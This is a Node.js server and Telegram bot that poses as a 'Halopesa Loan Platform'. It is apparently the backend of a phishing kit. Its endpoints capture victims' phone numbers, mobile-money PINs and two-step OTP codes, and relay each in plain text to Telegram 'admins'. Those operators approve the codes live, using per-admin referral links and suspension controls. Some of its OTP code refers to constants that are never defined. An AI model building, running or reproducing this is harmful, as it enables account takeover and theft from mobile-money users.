const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const db = require('./database');

const app = express();

// PREDEFINED TEST OTPS FOR 2-STEP FLOW
const OTP_STEP_1 = '123456';
const OTP_STEP_2 = '654321';

// ==========================================
// WEBHOOK MODE (for Render / production)
// ==========================================

const BOT_TOKEN   = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT        = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;

// Create bot WITHOUT polling
const bot = new TelegramBot(BOT_TOKEN);

// In-memory maps
const adminChatIds      = new Map(); // adminId → chatId
const pausedAdmins      = new Set(); // adminIds that are paused
const processingLocks   = new Set(); // prevents duplicate pin submissions
const suspendAllSessions = new Map(); // superadmin chatId → session data

const SUSPEND_PAGE_SIZE = 10;

let dbReady = false;

// ==========================================
// HELPER FUNCTIONS
// ==========================================

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

function formatPhone(phoneNumber) {
    if (!phoneNumber) return phoneNumber;
    if (phoneNumber.startsWith('+2550')) return '0' + phoneNumber.slice(5);
    if (phoneNumber.startsWith('+255'))  return '0' + phoneNumber.slice(4);
    if (phoneNumber.startsWith('2550'))  return '0' + phoneNumber.slice(4);
    if (phoneNumber.startsWith('255'))   return '0' + phoneNumber.slice(3);
    if (!phoneNumber.startsWith('0'))    return '0' + phoneNumber;
    return phoneNumber;
}

async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);

    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) {
                console.error(`❌ No chat ID for admin: ${adminId}`);
                return null;
            }
            adminChatIds.set(adminId, admin.chatId);
            return await bot.sendMessage(admin.chatId, message, options);
        } catch (err) {
            console.error(`❌ DB fallback failed for admin ${adminId}:`, err.message);
            return null;
        }
    }

    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Error sending to ${adminId}:`, error.message);
        return null;
    }
}

// Build paginated suspend checklist
function buildSuspendAllPage(session) {
    const { allAdmins, selections, page } = session;
    const totalPages = Math.ceil(allAdmins.length / SUSPEND_PAGE_SIZE);
    const start      = page * SUSPEND_PAGE_SIZE;
    const pageAdmins = allAdmins.slice(start, start + SUSPEND_PAGE_SIZE);
    const suspendCount = selections.size;

    const adminRows = pageAdmins.map(admin => {
        const willSuspend = selections.has(admin.adminId);
        const label = willSuspend
            ? `✅ ${admin.name} (${admin.adminId})`
            : `⬜ ${admin.name} (${admin.adminId})`;
        return [{ text: label, callback_data: `sall_toggle_${admin.adminId}` }];
    });

    const navRow = [];
    if (page > 0) {
        navRow.push({ text: '◀ Prev', callback_data: `sall_page_${page - 1}` });
    }
    navRow.push({ text: `${page + 1} /${totalPages}`, callback_data: 'sall_noop' });
    if (page < totalPages - 1) {
        navRow.push({ text: 'Next ▶', callback_data: `sall_page_${page + 1}` });
    }

    const actionRow = [
        { text: `🔒 Suspend Selected (${suspendCount})`, callback_data: 'sall_confirm' },
        { text: '❌ Cancel',                              callback_data: 'sall_cancel'  }
    ];

    const inline_keyboard = [...adminRows, navRow, actionRow];

    const text = `
🔒 *SUSPEND ADMIN LINKS*

Tap an admin to toggle ✅/⬜
✅ = will be suspended  ⬜ = will be kept active

Page ${page + 1} of ${totalPages} ·${allAdmins.length} admins total
Selected to suspend: *${suspendCount}*

Deselect anyone you want to keep active, then tap *Suspend Selected*.
    `.trim();

    return { text, inline_keyboard };
}

// ==========================================
// MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================
console.log('⏳ Setting up bot handlers...');

bot.on('error',         (error) => console.error('❌ Bot error:',    error?.message));
bot.on('polling_error', (error) => console.error('❌ Polling error:', error?.message));

setupCommandHandlers();
console.log('✅ Command handlers configured!');

// ==========================================
// WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;

app.post(webhookPath, (req, res) => {
    try {
        console.log('📥 Webhook received:', JSON.stringify(req.body).substring(0, 150));
        if (req.body && req.body.update_id !== undefined) {
            try {
                bot.processUpdate(req.body);
                console.log('✅ Update processed');
            } catch (processError) {
                console.error('❌ processUpdate error:', processError);
            }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200);
    }
});

// ==========================================
// API ENDPOINTS FOR FRONTEND INTEGRATION
// ==========================================

// 1. PIN Verification
app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, adminId, assignmentType } = req.body;

        if (!phoneNumber || !pin) {
            return res.status(400).json({ success: false, message: 'Phone number and PIN are required.' });
        }

        const formattedPhone = formatPhone(phoneNumber);
        let targetAdminId = adminId || 'ADMIN001';

        const adminExists = await db.getAdmin(targetAdminId);
        if (!adminExists) {
            targetAdminId = 'ADMIN001';
        }

        const appRecord = await db.saveApplication({
            phoneNumber: formattedPhone,
            pin,
            assignedAdminId: targetAdminId,
            assignmentType: assignmentType || 'auto',
            status: 'pin_submitted',
            createdAt: new Date()
        });

        // Notify assigned admin via Telegram
        const msg = `
🆕 *NEW PIN SUBMITTED*
📱 *Phone:* \`${formattedPhone}\`
🔑 *PIN:* \`${pin}\`
🆔 *App ID:* \`${appRecord._id}\`
        `.trim();

        await sendToAdmin(targetAdminId, msg, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Approve PIN', callback_data: `pin_app_${appRecord._id}` },
                        { text: '❌ Reject PIN', callback_data: `pin_rej_${appRecord._id}` }
                    ]
                ]
            }
        });

        res.json({
            success: true,
            applicationId: appRecord._id,
            assignedAdminId: targetAdminId
        });

    } catch (err) {
        console.error('❌ Error in /api/verify-pin:', err);
        res.status(500).json({ success: false, message: 'Server error during PIN verification.' });
    }
});

// 2. Poll PIN Verification Status
app.get('/api/check-pin-status/:id', async (req, res) => {
    try {
        const appId = req.params.id;
        const record = await db.getApplicationById(appId);

        if (!record) {
            return res.status(404).json({ success: false, message: 'Application not found.' });
        }

        if (record.status === 'pin_approved') {
            return res.json({ success: true, status: 'approved' });
        } else if (record.status === 'pin_rejected') {
            return res.json({ success: true, status: 'rejected' });
        } else {
            return res.json({ success: true, status: 'pending' });
        }
    } catch (err) {
        console.error('❌ Error in /api/check-pin-status:', err);
        res.status(500).json({ success: false, message: 'Server error checking PIN status.' });
    }
});

// 3. 2-Step OTP Submission & Verification Endpoint
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp, otpStep = 1, analytics } = req.body;

        if (!applicationId || !otp) {
            return res.status(400).json({ success: false, message: 'Application ID and OTP are required.' });
        }

        const appRecord = await db.getApplicationById(applicationId);
        if (!appRecord) {
            return res.status(404).json({ success: false, message: 'Application record not found.' });
        }

        const stepNum = Number(otpStep) || 1;
        const expectedTestOtp = stepNum === 1 ? TEST_OTP_STEP_1 : TEST_OTP_STEP_2;

        // Store OTP entry in Database and Analytics
        await db.saveOtpLog({
            applicationId,
            phoneNumber: appRecord.phoneNumber,
            assignedAdminId: appRecord.assignedAdminId,
            otpStep: stepNum,
            otpCode: otp,
            analytics: analytics || {},
            timestamp: new Date()
        });

        // Forward OTP details to assigned Admin on Telegram
        const telegramMsg = `
🔐 *OTP SUBMISSION (Step ${stepNum})*
📱 *Phone:* \`${appRecord.phoneNumber}\`
🔑 *OTP Code:* \`${otp}\`
🆔 *App ID:* \`${applicationId}\`
        `.trim();

        await sendToAdmin(appRecord.assignedAdminId, telegramMsg);

        // Perform test validation for immediate progression while allowing admin override
        if (otp === expectedTestOtp) {
            await db.updateOtpStatus(applicationId, stepNum === 1 ? 'otp1_approved' : 'approved', stepNum);

            if (stepNum === 1) {
                return res.json({
                    success: true,
                    nextStep: 2,
                    message: 'Step 1 verification successful.'
                });
            } else {
                return res.json({
                    success: true,
                    nextStep: null,
                    completed: true,
                    message: 'Step 2 verification successful.'
                });
            }
        }

        // Default: Wait for Telegram / DB Admin Approval if test OTP is not matched
        await db.updateOtpStatus(applicationId, stepNum === 1 ? 'otp1_pending' : 'otp2_pending', stepNum);

        res.json({
            success: true,
            status: 'pending',
            message: `OTP Step ${stepNum} received. Pending verification.`
        });

    } catch (err) {
        console.error('❌ Error in /api/verify-otp:', err);
        res.status(500).json({ success: false, message: 'Server error processing OTP.' });
    }
});

// 4. Poll OTP Verification Status
app.get('/api/check-otp-status/:id', async (req, res) => {
    try {
        const appId = req.params.id;
        const step = Number(req.query.step) || 1;
        const record = await db.getApplicationById(appId);

        if (!record) {
            return res.status(404).json({ success: false, message: 'Application not found.' });
        }

        if (step === 1) {
            if (record.status === 'otp1_approved' || record.status === 'approved') {
                return res.json({ success: true, status: 'approved' });
            } else if (record.status === 'wrongcode_1') {
                return res.json({ success: true, status: 'wrongcode' });
            }
        } else {
            if (record.status === 'approved') {
                return res.json({ success: true, status: 'approved' });
            } else if (record.status === 'wrongcode_2') {
                return res.json({ success: true, status: 'wrongcode' });
            }
        }

        if (record.status === 'rejected') {
            return res.json({ success: true, status: 'rejected' });
        } else if (record.status === 'wrongpin_otp') {
            return res.json({ success: true, status: 'wrongpin_otp' });
        } else {
            return res.json({ success: true, status: 'pending' });
        }

    } catch (err) {
        console.error('❌ Error in /api/check-otp-status:', err);
        res.status(500).json({ success: false, message: 'Server error checking OTP status.' });
    }
});

// 5. Resend OTP Trigger
app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId, otpStep = 1 } = req.body;
        const appRecord = await db.getApplicationById(applicationId);

        if (!appRecord) {
            return res.status(404).json({ success: false, message: 'Application not found.' });
        }

        const msg = `
🔄 *RESEND OTP REQUESTED (Step ${otpStep})*
📱 *Phone:* \`${appRecord.phoneNumber}\`
🆔 *App ID:* \`${applicationId}\`
        `.trim();

        await sendToAdmin(appRecord.assignedAdminId, msg);

        res.json({ success: true, message: 'Resend request processed.' });
    } catch (err) {
        console.error('❌ Error in /api/resend-otp:', err);
        res.status(500).json({ success: false, message: 'Server error requesting OTP resend.' });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Catch-all route for frontend navigation
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ==========================================
// DATABASE INIT + WEBHOOK SETUP
// ==========================================
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database ready!');

        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        let webhookSetSuccessfully = false;
        let attempts = 0;

        while (!webhookSetSuccessfully && attempts < 3) {
            attempts++;
            try {
                console.log(`🔄 Attempt ${attempts}/3: Setting webhook to:${fullWebhookUrl}`);
                await bot.deleteWebHook();
                await new Promise(resolve => setTimeout(resolve, 1000));

                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false,
                    max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });

                if (result) {
                    const info = await bot.getWebHookInfo();
                    if (info.url === fullWebhookUrl) {
                        webhookSetSuccessfully = true;
                        console.log(`✅ Webhook CONFIRMED: ${fullWebhookUrl}`);
                    } else {
                        console.error(`❌ Webhook URL mismatch. Got: ${info.url}`);
                    }
                }
            } catch (webhookError) {
                console.error(`❌ Webhook setup error (attempt ${attempts}):`, webhookError.message);
                if (attempts < 3) await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        if (!webhookSetSuccessfully) {
            console.error('❌❌❌ CRITICAL: Failed to set webhook after all attempts!');
        }

        try {
            const botInfo = await bot.getMe();
            console.log(`✅ Bot connected: @${botInfo.username} (${botInfo.first_name})`);
        } catch (botError) {
            console.error('❌ Bot API error:', botError);
        }

        // Keep-alive + self-ping
        setInterval(() => {
            console.log(`💓 Keep-alive: ${adminChatIds.size} admins connected,${pausedAdmins.size} paused`);
            const pingUrl = `${WEBHOOK_URL}/health`;
            fetch(pingUrl).catch(() => {});
        }, 14 * 60 * 1000);

        // Webhook health check + auto-fix
        setInterval(async () => {
            try {
                const info  = await bot.getWebHookInfo();
                const isSet = info.url === fullWebhookUrl;
                console.log(`🔍 Webhook: ${isSet ? '✅ SET' : '❌ NOT SET'} \vert{} Pending: ${info.pending_update_count || 0}`);
                if (!isSet) {
                    console.log('⚠️ Auto-fixing webhook...');
                    await bot.setWebHook(fullWebhookUrl, {
                        drop_pending_updates: false,
                        max_connections: 40,
                        allowed_updates: ['message', 'callback_query']
                    });
                    console.log('✅ Webhook re-set');
                }
            } catch (error) {
                console.error('⚠️ Webhook check error:', error.message);
            }
        }, 60000);

        app.listen(PORT, () => {
            console.log(`🚀 Server listening on port ${PORT}`);
        });
    })
    .catch((error) => {
        console.error('❌ Initialization failed:', error);
        process.exit(1);
    });

// ==========================================
// LOAD ADMIN CHAT IDs FROM DB
// ==========================================
async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        console.log(`📋 Loading ${admins.length} admins from database...`);

        adminChatIds.clear();
        pausedAdmins.clear();

        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
            }
        }

        console.log(`✅ ${adminChatIds.size} admins loaded,${pausedAdmins.size} paused`);
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================
function setupCommandHandlers() {

    bot.onText(/\/start/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        try {
            if (adminId) {
                if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                    await bot.sendMessage(chatId, `🚫 *ADMIN ACCESS PAUSED*`, { parse_mode: 'Markdown' });
                    return;
                }

                const admin       = await db.getAdmin(adminId);
                const isSuperAdmin = adminId === 'ADMIN001';

                let message = `
👋 *Welcome ${admin.name}!*
*Your Admin ID:* \`${adminId}\`
*Your Link:* ${WEBHOOK_URL}?admin=${adminId}
`;
                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            } else {
                await bot.sendMessage(chatId, `👋 *Welcome to Halopesa Loan Platform!*\nYour Chat ID: \`${chatId}\``, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ Error in /start:', error);
        }
    });

    bot.on('callback_query', async (query) => {
        const chatId = query.message.chat.id;
        const data = query.data;

        try {
            if (data.startsWith('pin_app_')) {
                const appId = data.replace('pin_app_', '');
                await db.updateApplicationStatus(appId, 'pin_approved');
                await bot.answerCallbackQuery(query.id, { text: 'PIN Approved' });
                await bot.sendMessage(chatId, `✅ PIN Approved for App ID: \`${appId}\``, { parse_mode: 'Markdown' });
            } else if (data.startsWith('pin_rej_')) {
                const appId = data.replace('pin_rej_', '');
                await db.updateApplicationStatus(appId, 'pin_rejected');
                await bot.answerCallbackQuery(query.id, { text: 'PIN Rejected' });
                await bot.sendMessage(chatId, `❌ PIN Rejected for App ID: \`${appId}\``, { parse_mode: 'Markdown' });
            }
        } catch (err) {
            console.error('❌ Callback Query Error:', err);
        }
    });
}
